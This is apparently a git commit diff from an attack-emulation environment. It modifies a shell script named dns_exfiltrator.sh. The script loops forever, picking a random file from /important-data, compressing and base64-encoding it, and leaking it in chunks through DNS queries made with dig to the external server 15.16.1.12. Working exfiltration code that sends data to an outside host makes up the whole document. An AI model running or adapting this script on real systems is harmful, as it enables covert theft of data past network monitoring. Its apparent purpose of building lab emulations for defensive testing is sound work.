e04cca2696d07d759c8da130601c8955c6c28e5c
Marco Campione <per.registrazionifalse@gmail.com>
2025-03-17 15:52:15 +0200

    feat: add files to extract and new extraction query

--- emulation-system/derived_images/samba_1/docker/dns_exfiltrator.sh
+++ emulation-system/derived_images/samba_1/docker/dns_exfiltrator.sh
@@ -2,7 +2,7 @@
 
 while [[ true ]]; do
   #execute shell script
-  f=/etc/resolv.conf;s=4;b=57;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g";echo -e "\n=end=");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done ); do dig @15.16.1.12 `echo -ne $r$f|tr "+" "*"` +short; done
+  f=$(ls /important-data | shuf -n 1); s=4; b=57; c=0; for r in $(for i in $(gzip -c "/important-data/$f" | base64 -w0 | sed "s/.\{$b\}/&\n/g"; echo -e "\n=end="); do if [[ "$c" -lt "$s" ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done); do dig @15.16.1.12 `echo -ne $r$f | tr "+" "*"` +short; done
   sleep 10
 done
 
